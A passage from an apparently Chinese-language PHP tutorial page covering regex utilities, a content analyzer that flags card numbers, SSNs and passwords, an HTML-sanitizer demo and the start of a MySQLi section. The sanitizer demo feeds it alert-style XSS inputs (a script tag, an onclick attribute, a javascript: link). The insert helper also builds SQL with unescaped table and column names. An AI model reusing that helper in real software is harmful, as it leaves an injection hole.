E_USER_WARNING);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span> === <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">safeRegexMatchAll</span>(<span class="params"><span class="variable">$pattern</span>, <span class="variable">$subject</span>, <span class="variable">$flags</span> = PREG_PATTERN_ORDER</span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">set_error_handler</span>(function() &#123;&#125;);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern</span>, <span class="variable">$subject</span>, <span class="variable">$matches</span>, <span class="variable">$flags</span>);</span><br><span class="line">        <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="title function_ invoke__">preg_last_error</span>();</span><br><span class="line">            <span class="variable">$errorMsg</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getPregError</span>(<span class="variable">$error</span>);</span><br><span class="line">            <span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;正则表达式错误: <span class="subst">$errorMsg</span>&quot;</span>, E_USER_WARNING);</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>] ?? [];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getPregError</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> PREG_NO_ERROR: <span class="keyword">return</span> <span class="string">&quot;无错误&quot;</span>;</span><br><span class="line">            <span class="keyword">case</span> PREG_INTERNAL_ERROR: <span class="keyword">return</span> <span class="string">&quot;内部错误&quot;</span>;</span><br><span class="line">            <span class="keyword">case</span> PREG_BACKTRACK_LIMIT_ERROR: <span class="keyword">return</span> <span class="string">&quot;回溯限制超出&quot;</span>;</span><br><span class="line">            <span class="keyword">case</span> PREG_RECURSION_LIMIT_ERROR: <span class="keyword">return</span> <span class="string">&quot;递归限制超出&quot;</span>;</span><br><span class="line">            <span class="keyword">case</span> PREG_BAD_UTF8_ERROR: <span class="keyword">return</span> <span class="string">&quot;无效的UTF-8数据&quot;</span>;</span><br><span class="line">            <span class="keyword">case</span> PREG_BAD_UTF8_OFFSET_ERROR: <span class="keyword">return</span> <span class="string">&quot;无效的UTF-8偏移量&quot;</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="string">&quot;未知错误 (<span class="subst">$code</span>)&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. 综合应用案例：文本内容分析器</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【8. 综合应用：智能文本内容分析器】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentAnalyzer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$analysis</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;text = <span class="variable">$text</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;analysis = [];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">analyze</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">analyzeSentences</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">analyzeKeywords</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">detectEntities</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">identifySensitiveContent</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;analysis;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">analyzeSentences</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 智能分割句子(处理缩写、引号等情况)</span></span><br><span class="line">        <span class="variable">$sentencePattern</span> = <span class="string">&#x27;/</span></span><br><span class="line"><span class="string">            (?&lt;=                # 后顾断言</span></span><br><span class="line"><span class="string">                [.!?]           # 句号、问号、感叹号</span></span><br><span class="line"><span class="string">                [\]\])\&#x27;&quot;]*     # 可能跟随引号或括号</span></span><br><span class="line"><span class="string">                \s+             # 后跟空白</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            (?=[A-Z])           # 前瞻断言: 下一个字符是大写字母</span></span><br><span class="line"><span class="string">            |                   # 或者</span></span><br><span class="line"><span class="string">            (?&lt;=                # 处理缩写</span></span><br><span class="line"><span class="string">                \b(?:Mr|Mrs|Dr|Prof|Inc|Ltd|Jr|Sr|vs)\.</span></span><br><span class="line"><span class="string">                \s+</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            (?=[A-Z])/x&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$sentences</span> = <span class="title function_ invoke__">preg_split</span>(<span class="variable">$sentencePattern</span>, <span class="variable">$this</span>-&gt;text, -<span class="number">1</span>, PREG_SPLIT_NO_EMPTY);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;analysis[<span class="string">&#x27;sentences&#x27;</span>] = <span class="variable">$sentences</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;analysis[<span class="string">&#x27;sentence_count&#x27;</span>] = <span class="title function_ invoke__">count</span>(<span class="variable">$sentences</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">analyzeKeywords</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 提取关键词(排除停用词)</span></span><br><span class="line">        <span class="variable">$wordPattern</span> = <span class="string">&#x27;/\b(?!(?:the|and|or|in|on|at|to|for|with|a|an|of|is|are|was|were|be|been|being)\b)[a-zA-Z]&#123;3,&#125;\b/&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$wordPattern</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;text), <span class="variable">$matches</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$words</span> = <span class="title function_ invoke__">array_count_values</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="title function_ invoke__">arsort</span>(<span class="variable">$words</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;analysis[<span class="string">&#x27;top_keywords&#x27;</span>] = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$words</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">detectEntities</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 检测URL、邮箱、电话</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;analysis[<span class="string">&#x27;urls&#x27;</span>] = <span class="title class_">AdvancedRegexHelper</span>::<span class="title function_ invoke__">extractUrls</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;analysis[<span class="string">&#x27;emails&#x27;</span>] = <span class="title class_">AdvancedRegexHelper</span>::<span class="title function_ invoke__">extractEmails</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;analysis[<span class="string">&#x27;phones&#x27;</span>] = <span class="title class_">AdvancedRegexHelper</span>::<span class="title function_ invoke__">extractPhoneNumbers</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">identifySensitiveContent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 识别潜在敏感内容</span></span><br><span class="line">        <span class="variable">$patterns</span> = [</span><br><span class="line">            <span class="string">&#x27;credit_cards&#x27;</span> =&gt; <span class="string">&#x27;/\b(?:\d[ -]*?)&#123;13,16&#125;\b/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;ssn&#x27;</span> =&gt; <span class="string">&#x27;/\b\d&#123;3&#125;[- ]?\d&#123;2&#125;[- ]?\d&#123;4&#125;\b/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password_like&#x27;</span> =&gt; <span class="string">&#x27;/\b(password|pass|pwd)\s*[:=]\s*[\&#x27;&quot;]?[\w@#$%^&amp;*!]&#123;5,&#125;[\&#x27;&quot;]?\b/i&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$patterns</span> <span class="keyword">as</span> <span class="variable">$type</span> =&gt; <span class="variable">$pattern</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern</span>, <span class="variable">$this</span>-&gt;text, <span class="variable">$matches</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$matches</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;analysis[<span class="string">&#x27;sensitive&#x27;</span>][<span class="variable">$type</span>] = <span class="title function_ invoke__">count</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getReport</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$analysis</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">analyze</span>();</span><br><span class="line">        <span class="variable">$report</span> = <span class="string">&quot;===== 内容分析报告 =====\n&quot;</span>;</span><br><span class="line">        <span class="variable">$report</span> .= <span class="string">&quot;句子数量: <span class="subst">&#123;$analysis[&#x27;sentence_count&#x27;]&#125;</span>\n\n&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$report</span> .= <span class="string">&quot;【关键词频率】\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$analysis</span>[<span class="string">&#x27;top_keywords&#x27;</span>] <span class="keyword">as</span> <span class="variable">$word</span> =&gt; <span class="variable">$count</span>) &#123;</span><br><span class="line">            <span class="variable">$report</span> .= <span class="string">&quot;- <span class="subst">$word</span>: <span class="subst">$count</span> 次\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$report</span> .= <span class="string">&quot;\n【检测到的实体】\n&quot;</span>;</span><br><span class="line">        <span class="variable">$report</span> .= <span class="string">&quot;- 链接: &quot;</span> . (<span class="keyword">empty</span>(<span class="variable">$analysis</span>[<span class="string">&#x27;urls&#x27;</span>]) ? <span class="string">&quot;无&quot;</span> : <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$analysis</span>[<span class="string">&#x27;urls&#x27;</span>])) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable">$report</span> .= <span class="string">&quot;- 邮箱: &quot;</span> . (<span class="keyword">empty</span>(<span class="variable">$analysis</span>[<span class="string">&#x27;emails&#x27;</span>]) ? <span class="string">&quot;无&quot;</span> : <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$analysis</span>[<span class="string">&#x27;emails&#x27;</span>])) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="variable">$report</span> .= <span class="string">&quot;- 电话: &quot;</span> . (<span class="keyword">empty</span>(<span class="variable">$analysis</span>[<span class="string">&#x27;phones&#x27;</span>]) ? <span class="string">&quot;无&quot;</span> : <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$analysis</span>[<span class="string">&#x27;phones&#x27;</span>])) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$analysis</span>[<span class="string">&#x27;sensitive&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$report</span> .= <span class="string">&quot;\n【警告: 检测到敏感内容】\n&quot;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$analysis</span>[<span class="string">&#x27;sensitive&#x27;</span>] <span class="keyword">as</span> <span class="variable">$type</span> =&gt; <span class="variable">$count</span>) &#123;</span><br><span class="line">                <span class="variable">$report</span> .= <span class="string">&quot;- <span class="subst">$type</span>: <span class="subst">$count</span> 处\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$report</span> .= <span class="string">&quot;请检查内容是否包含不应公开的个人信息!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$report</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. 演示工具类用法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【9. 高级工具类应用演示】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证示例</span></span><br><span class="line"><span class="variable">$emails</span> = [<span class="string">&quot;user@example.com&quot;</span>, <span class="string">&quot;invalid-email@&quot;</span>, <span class="string">&quot;name+tag@sub.domain.co.uk&quot;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$emails</span> <span class="keyword">as</span> <span class="variable">$email</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;邮箱 &#x27;%s&#x27;: %s\n&quot;</span>, </span><br><span class="line">        <span class="variable">$email</span>, </span><br><span class="line">        <span class="title class_">AdvancedRegexHelper</span>::<span class="title function_ invoke__">validateEmail</span>(<span class="variable">$email</span>) ? <span class="string">&quot;✓ 有效&quot;</span> : <span class="string">&quot;✗ 无效&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 信用卡掩码</span></span><br><span class="line"><span class="variable">$cards</span> = [</span><br><span class="line">    <span class="string">&quot;4111 1111 1111 1111&quot;</span>,  <span class="comment">// Visa</span></span><br><span class="line">    <span class="string">&quot;5500 0000 0000 0004&quot;</span>,  <span class="comment">// Mastercard</span></span><br><span class="line">    <span class="string">&quot;3400 0000 0000 009&quot;</span>    <span class="comment">// Amex</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cards</span> <span class="keyword">as</span> <span class="variable">$card</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;信用卡: <span class="subst">$card</span> → &quot;</span> . <span class="title class_">AdvancedRegexHelper</span>::<span class="title function_ invoke__">maskCreditCard</span>(<span class="variable">$card</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HTML清理</span></span><br><span class="line"><span class="variable">$html_content</span> = <span class="string">&#x27;&lt;p&gt;安全内容 &lt;b&gt;加粗&lt;/b&gt; 和 &lt;a href=&quot;https://example.com&quot; onclick=&quot;alert(1)&quot;&gt;链接&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;alert(&quot;XSS攻击&quot;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">合法&lt;a href=&quot;http://example.com/path&quot;&gt;内部链接&lt;/a&gt;和&lt;a href=&quot;javascript:alert(\&#x27;bad\&#x27;)&quot;&gt;危险链接&lt;/a&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n原始HTML:\n<span class="subst">$html_content</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n清理后的HTML:\n&quot;</span> . <span class="title class_">AdvancedRegexHelper</span>::<span class="title function_ invoke__">sanitizeHtml</span>(<span class="variable">$html_content</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. 综合案例演示</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【10. 综合案例：内容安全分析】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sample_text</span> = <span class="string">&lt;&lt;&lt;TEXT</span></span><br><span class="line"><span class="string">这是一份测试文档。其中包含一个有效的URL: https://www.example.com/path?query=1#section1</span></span><br><span class="line"><span class="string">同时还有测试邮箱: contact@example.com 和 support.team@example.co.uk</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">请注意，我的信用卡号是 4111 1111 1111 1111，社会保险号 123-45-6789。</span></span><br><span class="line"><span class="string">密码设置为: password=SecurePass123</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">联系我: (123) 456-7890 或 987-654-3210</span></span><br><span class="line"><span class="string">更多信息请访问 www.our-company.com 或联系 admin@company.com</span></span><br><span class="line"><span class="string">TEXT</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$analyzer</span> = <span class="keyword">new</span> <span class="title class_">ContentAnalyzer</span>(<span class="variable">$sample_text</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$analyzer</span>-&gt;<span class="title function_ invoke__">getReport</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 11. 正则表达式性能优化技巧</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【11. 正则表达式性能优化技巧】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$large_text</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit. &quot;</span>, <span class="number">1000</span>);</span><br><span class="line"><span class="variable">$search_word</span> = <span class="string">&quot;dolor&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非优化版本</span></span><br><span class="line"><span class="variable">$pattern_unoptimized</span> = <span class="string">&#x27;/\b&#x27;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$search_word</span>, <span class="string">&#x27;/&#x27;</span>) . <span class="string">&#x27;\b/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优化版本</span></span><br><span class="line"><span class="variable">$pattern_optimized</span> = <span class="string">&#x27;/\b&#x27;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="variable">$search_word</span>, <span class="string">&#x27;/&#x27;</span>) . <span class="string">&#x27;\b/S&#x27;</span>;  <span class="comment">// S修饰符表示研究正则表达式并优化</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iterations</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$time_unoptimized</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$time_optimized</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$iterations</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern_unoptimized</span>, <span class="variable">$large_text</span>, <span class="variable">$matches</span>);</span><br><span class="line">    <span class="variable">$time_unoptimized</span> += <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) - <span class="variable">$start</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern_optimized</span>, <span class="variable">$large_text</span>, <span class="variable">$matches</span>);</span><br><span class="line">    <span class="variable">$time_optimized</span> += <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) - <span class="variable">$start</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;性能测试 (平均时间):\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;非优化模式: &quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%.6f&#x27;</span>, <span class="variable">$time_unoptimized</span> / <span class="variable">$iterations</span>) . <span class="string">&quot; 秒\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;优化模式(S修饰符): &quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%.6f&#x27;</span>, <span class="variable">$time_optimized</span> / <span class="variable">$iterations</span>) . <span class="string">&quot; 秒\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;性能提升: &quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%.1f&#x27;</span>, (<span class="variable">$time_unoptimized</span> / <span class="variable">$time_optimized</span>) * <span class="number">100</span>) . <span class="string">&quot;%\n&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="17-PHP与MySQL"><a href="#17-PHP与MySQL" class="headerlink" title="17. PHP与MySQL"></a>17. PHP与MySQL</h2><h3 id="详细解释-16"><a href="#详细解释-16" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP提供了多种方式与MySQL数据库交互，主要包括：</p>
<ul>
<li><strong>MySQLi</strong>（MySQL Improved）：面向对象和过程式接口</li>
<li><strong>PDO</strong>（PHP Data Objects）：数据访问抽象层，支持多种数据库</li>
</ul>
<h3 id="连接数据库步骤："><a href="#连接数据库步骤：" class="headerlink" title="连接数据库步骤："></a>连接数据库步骤：</h3><ol>
<li>创建数据库连接</li>
<li>执行SQL查询</li>
<li>处理结果集</li>
<li>关闭连接</li>
</ol>
<h3 id="重要概念："><a href="#重要概念：" class="headerlink" title="重要概念："></a>重要概念：</h3><ul>
<li><strong>预处理语句</strong>：防止SQL注入，提高性能</li>
<li><strong>事务</strong>：确保多个操作的原子性</li>
<li><strong>错误处理</strong>：捕获和处理数据库错误</li>
<li><strong>静态方法</strong>：用于创建单例模式或工具类</li>
</ul>
<h3 id="17-1-使用MySQLi（面向对象）"><a href="#17-1-使用MySQLi（面向对象）" class="headerlink" title="17.1 使用MySQLi（面向对象）"></a>17.1 使用MySQLi（面向对象）</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 数据库连接参数</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;test_db&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据库工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Database</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态实例（单例模式）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$connection</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 私有构造函数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;connection = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;connection-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable language_">$this</span>-&gt;connection-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取单例实例</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$host</span> = <span class="string">&#x27;localhost&#x27;</span>, <span class="variable">$username</span> = <span class="string">&#x27;root&#x27;</span>, <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$database</span> = <span class="string">&#x27;test_db&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable">$instance</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$instance</span> = <span class="keyword">new</span> <span class="built_in">self</span>(<span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$instance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;connection;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：执行查询</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$params</span> = []</span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$instance</span>-&gt;connection-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$params</span>) &#123;</span><br><span class="line">            <span class="variable">$types</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;s&#x27;</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$params</span>));</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="variable">$types</span>, ...<span class="variable">$params</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：插入数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$instance</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getInstance</span>();</span><br><span class="line">        <span class="variable">$keys</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$values</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$data</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$placeholders</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_fill</span>(<span class="number">0</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$keys</span>), <span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">        <span class="variable">$columns</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$keys</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$columns</span>) VALUES (<span class="subst">$placeholders</span>)&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$instance</span>-&gt;connection-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$types</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;s&#x27;</span>, <span class="title function_ invoke__">count</span>(<span class="variable">$values</span>));</span><br><span class="line">        <span 